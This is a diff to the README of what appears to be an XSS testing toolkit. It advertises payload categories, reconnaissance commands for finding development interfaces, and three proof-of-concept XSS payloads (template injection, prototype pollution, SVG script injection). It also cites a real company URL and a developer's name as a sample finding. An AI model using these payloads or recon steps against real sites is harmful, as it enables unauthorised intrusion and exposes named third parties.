@@ -22,7 +22,90 @@ This repository now contains the most advanced XSS testing toolkit available, fe
 - **🏺 Unicode Exploitation** - Zero-width, RTL, Cuneiform script techniques
 - **⚡ Modern JavaScript** - async/await, dynamic imports, ServiceWorker injection
 - **🧬 Prototype Pollution** - Constructor chain manipulation
-- **👁️ DOM Monitoring** - MutationObserver bypass techniques
+- **👁️ DOM Monitoring**: 20+ MutationObserver bypass techniques
+
+## 🔥 **Advanced XSS Categories (NEW!)**
+
+**6 New God-Tier Categories Added to XSS Vibes V2**
+
+### 📋 **Category Overview**
+- **🎯 Template Injection** (8 payloads) - SSTI, Mustache, AngularJS expressions
+- **⚡ Event Handler Injection** (8 payloads) - Dynamic events, setAttribute abuse  
+- **🌐 JavaScript URI Injection** (8 payloads) - Protocol handlers, window.location
+- **🖼️ innerHTML SVG Namespace** (8 payloads) - SVG, mixed namespaces
+- **🧬 JavaScript Proto Pollution XSS** (8 payloads) - Prototype pollution chains
+- **📡 URL JS Context** (8 payloads) - Script src, JSONP callbacks
+
+## 🕷️ **Advanced Reconnaissance System (NEW!)**
+
+**Osmedeus-Style Crawler with Development Interface Discovery**
+
+### 🔍 **Development Interface Hunter**
+Specialized module for discovering hidden development environments:
+
+- **🎯 Target Discovery**: Dev/staging/test subdomains and paths
+- **👤 Developer Intelligence**: Extract author names, dates, version info
+- **🔧 Framework Detection**: Symfony, Laravel, Node.js debug interfaces
+- **📊 Confidence Scoring**: Smart assessment of finding reliability
+
+### ⚡ **Quick Reconnaissance**
+```bash
+# Hunt development interfaces
+make dev-hunt DOMAIN=example.com
+./tools/dev-hunter example.com
+
+# Full reconnaissance pipeline
+make hunt DOMAIN=example.com
+./tools/xss-crawler -d example.com -w my_scan
+
+# Multi-source intelligence
+./tools/xss-crawler -d example.com -f 'domain="example.com"' -s 'hostname:example.com'
+```
+
+### 🎯 **Real-World Example**
+```
+🔍 Development Interface Discovery
+
+URL: https://secure.trip.com/dev/test.html
+Confidence: 85%
+Developer: chen.yun
+Date: 2025-04-16 10:54:25
+Risk: Information Disclosure
+```
+
+### 🚀 **Quick Usage**
+```bash
+# Test all new categories
+python3 tools/test_advanced_categories.py
+
+# Test specific category
+python3 tools/test_advanced_categories.py template_injection
+
+# Use with AI tools
+xss-ai-domfuzz --contexts template_injection,prototype_pollution
+xss-context /path/to/app --format json
+```
+
+### 💀 **Example God-Tier Payloads**
+
+**Template Injection (Evasion Level: 10/10)**
+```javascript
+{{constructor.constructor('alert(1)')()}}
+```
+
+**Prototype Pollution XSS (Evasion Level: 10/10)**  
+```javascript
+__proto__.onerror = alert; throw 1;
+```
+
+**SVG Namespace Injection (Evasion Level: 10/10)**
+```html
+<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></div></foreignObject></svg>
+```
+
+📚 **[Complete Documentation](docs/ADVANCED_XSS_CATEGORIES.md)** | 📋 **[Quick Reference](docs/ADVANCED_CATEGORIES_QUICK_REF.md)**
+
+**Total: 48 Advanced Payloads | Evasion Level: 8-10/10**
 - **🛡️ CSP Evasion** - Content Security Policy circumvention
 
 ### 📊 **Technical Arsenal**
